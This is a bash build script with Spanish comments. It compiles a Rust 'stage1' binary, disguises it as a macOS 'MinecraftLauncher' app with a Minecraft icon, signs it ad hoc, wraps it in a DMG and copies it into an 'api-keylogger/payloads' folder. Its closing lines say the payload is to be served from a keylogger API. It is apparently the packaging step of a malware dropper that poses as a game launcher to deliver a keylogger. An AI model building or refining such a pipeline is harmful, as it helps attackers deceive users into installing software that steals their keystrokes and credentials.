#!/bin/bash
set -e

# ============================================================
#  Build script para Stage1 — MinecraftLauncher.app → .dmg
#  Uso: ./build.sh
# ============================================================

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
PROJECT_ROOT="$(dirname "$SCRIPT_DIR")"
STAGE1_DIR="$SCRIPT_DIR"
PAYLOADS_DIR="$PROJECT_ROOT/api-keylogger/payloads"

APP_NAME="MinecraftLauncher"
BUNDLE_NAME="$APP_NAME.app"
DMG_NAME="$APP_NAME.dmg"
BINARY_NAME="MinecraftLauncher"
ICON_FILE="minecraft.icns"

BUILD_DIR="$STAGE1_DIR/build"
APP_DIR="$BUILD_DIR/$BUNDLE_NAME"

echo "╔══════════════════════════════════════════╗"
echo "║   🎮 Build Stage1 — Minecraft Launcher   ║"
echo "╚══════════════════════════════════════════╝"
echo ""

# ── 1. Compilar Stage1 ──────────────────────────────────────
echo "🔨 [1/6] Compilando stage1 (release)..."
cd "$STAGE1_DIR"
cargo build --release 2>&1
echo "   ✅ Compilado"

# ── 2. Crear estructura del .app ─────────────────────────────
echo "📦 [2/6] Creando bundle $BUNDLE_NAME..."
rm -rf "$BUILD_DIR"
mkdir -p "$APP_DIR/Contents/MacOS"
mkdir -p "$APP_DIR/Contents/Resources"

# Copiar binario con nombre correcto
cp "$STAGE1_DIR/target/release/stage1" "$APP_DIR/Contents/MacOS/$BINARY_NAME"
chmod +x "$APP_DIR/Contents/MacOS/$BINARY_NAME"
echo "   ✅ Binario copiado como $BINARY_NAME"

# Copiar Info.plist
cp "$STAGE1_DIR/MiLauncher.app/Contents/Info.plist" "$APP_DIR/Contents/Info.plist"
echo "   ✅ Info.plist copiado"

# Copiar icono
if [ -f "$STAGE1_DIR/MiLauncher.app/Contents/Resources/$ICON_FILE" ]; then
    cp "$STAGE1_DIR/MiLauncher.app/Contents/Resources/$ICON_FILE" "$APP_DIR/Contents/Resources/$ICON_FILE"
    echo "   ✅ Icono copiado ($ICON_FILE)"
elif [ -f "$PAYLOADS_DIR/$ICON_FILE" ]; then
    cp "$PAYLOADS_DIR/$ICON_FILE" "$APP_DIR/Contents/Resources/$ICON_FILE"
    echo "   ✅ Icono copiado desde payloads ($ICON_FILE)"
else
    echo "   ⚠️  No se encontró $ICON_FILE — la app no tendrá icono"
fi

# ── 3. Firmar ad-hoc ────────────────────────────────────────
echo "🔏 [3/6] Firmando ad-hoc..."
codesign --force --deep --sign - "$APP_DIR" 2>&1
echo "   ✅ Firma ad-hoc aplicada"

# ── 4. Verificar bundle ─────────────────────────────────────
echo "🔍 [4/6] Verificando bundle..."
if [ -f "$APP_DIR/Contents/MacOS/$BINARY_NAME" ] && \
   [ -f "$APP_DIR/Contents/Info.plist" ] && \
   [ -f "$APP_DIR/Contents/Resources/$ICON_FILE" ]; then
    echo "   ✅ Bundle válido"
    echo "      ├── Contents/MacOS/$BINARY_NAME ($(wc -c < "$APP_DIR/Contents/MacOS/$BINARY_NAME" | tr -d ' ') bytes)"
    echo "      ├── Contents/Info.plist"
    echo "      └── Contents/Resources/$ICON_FILE"
else
    echo "   ❌ Bundle incompleto — revisa los archivos"
    exit 1
fi

# ── 5. Crear DMG ────────────────────────────────────────────
echo "💿 [5/6] Creando $DMG_NAME..."

DMG_TMP="$BUILD_DIR/tmp_rw.dmg"
DMG_FINAL="$BUILD_DIR/$DMG_NAME"
VOLUME_NAME="Minecraft Launcher"

# Calcular tamaño necesario (tamaño del .app + 5MB extra)
APP_SIZE_KB=$(du -sk "$APP_DIR" | cut -f1)
DMG_SIZE_KB=$((APP_SIZE_KB + 5120))

# Crear DMG de lectura-escritura
hdiutil create \
    -size "${DMG_SIZE_KB}k" \
    -fs HFS+ \
    -volname "$VOLUME_NAME" \
    -type SPARSE \
    "$DMG_TMP" \
    -quiet

# Montar
MOUNT_OUTPUT=$(hdiutil attach "${DMG_TMP}.sparseimage" -readwrite -noverify -quiet)
MOUNT_POINT=$(echo "$MOUNT_OUTPUT" | grep "/Volumes/" | awk '{print $NF}')

if [ -z "$MOUNT_POINT" ]; then
    MOUNT_POINT="/Volumes/$VOLUME_NAME"
fi

echo "   📂 Montado en: $MOUNT_POINT"

# Copiar .app al volumen
cp -R "$APP_DIR" "$MOUNT_POINT/"

# Opcional: crear link a /Applications
ln -s /Applications "$MOUNT_POINT/Applications" 2>/dev/null || true

# Desmontar
hdiutil detach "$MOUNT_POINT" -quiet

# Convertir a DMG comprimido de solo lectura
rm -f "$DMG_FINAL"
hdiutil convert \
    "${DMG_TMP}.sparseimage" \
    -format UDZO \
    -imagekey zlib-level=9 \
    -o "$DMG_FINAL" \
    -quiet

# Limpiar temporal
rm -f "${DMG_TMP}.sparseimage"

DMG_SIZE=$(wc -c < "$DMG_FINAL" | tr -d ' ')
echo "   ✅ $DMG_NAME creado ($DMG_SIZE bytes)"

# ── 6. Copiar a payloads ────────────────────────────────────
echo "📤 [6/6] Copiando a payloads..."
mkdir -p "$PAYLOADS_DIR"
cp "$DMG_FINAL" "$PAYLOADS_DIR/$DMG_NAME"

# También copiar el .app limpio
rm -rf "$PAYLOADS_DIR/MiLauncher.app"
cp -R "$APP_DIR" "$PAYLOADS_DIR/MiLauncher.app"

echo "   ✅ Copiado a $PAYLOADS_DIR/"

# ── Resumen ──────────────────────────────────────────────────
echo ""
echo "╔══════════════════════════════════════════╗"
echo "║           ✅ BUILD COMPLETO              ║"
echo "╠══════════════════════════════════════════╣"
echo "║ App:  $BUILD_DIR/$BUNDLE_NAME"
echo "║ DMG:  $BUILD_DIR/$DMG_NAME"
echo "║ Copy: $PAYLOADS_DIR/$DMG_NAME"
echo "╚══════════════════════════════════════════╝"
echo ""
echo "Para probar:"
echo "  open $DMG_FINAL"
echo ""
echo "Para servir desde la API:"
echo "  cd $PROJECT_ROOT/api-keylogger && cargo run"
